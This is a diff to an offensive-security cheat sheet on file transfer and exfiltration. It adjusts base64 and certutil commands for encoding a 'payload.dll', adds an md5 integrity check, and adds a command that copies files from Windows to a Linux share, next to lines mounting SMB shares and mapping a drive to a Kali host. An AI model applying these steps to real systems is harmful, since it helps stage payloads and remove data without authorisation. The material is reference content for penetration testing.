@@ -32,7 +32,7 @@ Check [https://lots-project.com/](https://lots-project.com/) to find commonly wh
 **Linux**
 
 ```bash
-base64 -w0 <file> #Encode file
+base64 -w 0 <file> #Encode file
 base64 -d file #Decode file
 ```
 
@@ -42,6 +42,7 @@ base64 -d file #Decode file
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
+> To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. `file <file>` `md5sum <file>`
 
 ## HTTP
 
@@ -224,6 +225,8 @@ CMD-Wind> net use Z: \\<ServerName>\<SharedFolder>
 CMD-Wind> net use Z: \\<ServerName>\<SharedFolder> /user:<username> <password> #For SMB using credentials
 2) #copy using  windwos 
 copy \\<ServerName>\<SharedFolder>\<FileName> <DestinationPath>
+copy C:\path\to\file.txt \\<Linux_IP>\shared\file.txt # from windows to linux
+
 
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
